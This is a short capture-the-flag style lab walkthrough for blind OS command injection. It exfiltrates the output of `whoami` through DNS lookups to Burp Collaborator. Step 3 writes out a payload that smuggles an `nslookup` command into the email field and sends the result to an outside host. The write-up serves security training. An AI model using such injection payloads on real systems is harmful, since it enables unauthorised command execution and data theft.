## Lab: Blind OS command injection with out-of-band data exfiltration
 
**Vulnerability**
Blind OS command injection in the feedback function. Async execution, no output redirection possible.
 
**Goal**
Execute `whoami` and exfiltrate the output via a DNS query to Burp Collaborator.
 
### Steps
 
1. Intercept the feedback request in Burp, send to Repeater.
  - ![alt text]({B5F5570E-5463-4785-81A3-45865B5FCC76}.png)
  
2. Go to **Burp > Collaborator** tab → **Copy to clipboard** to get a unique subdomain.
   - ![alt text]({892F4D9C-FC73-455E-8367-6CCA26209229}.png)
3. Modify the `email` parameter using command substitution:
```
   email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```
   `whoami` runs first, its output gets prepended as a subdomain to the DNS query — that's the exfiltration.
  - ![alt text]({236BEE14-FCD2-4404-8767-4ECB32964008}.png)
 
4. URL-encode (`Ctrl+U`) and send.
5. Go back to **Collaborator** tab → **Poll now** (wait a few seconds if nothing shows, execution is async).
   - ![alt text]({3E7AF59F-1D70-4C93-A93D-4187BF7548BE}.png)
6. Check the **Description** tab of the interaction — full looked-up domain shows the exfiltrated username, e.g. `peter-XXXX.xxxxxxxxxxxxx.oastify.com`.
    - peter-0ivaf2
7. Enter the extracted username into the lab's completion field to solve it.
  - ![alt text]({4188D9D6-A655-4C9D-A797-F2FBCB785CE4}.png)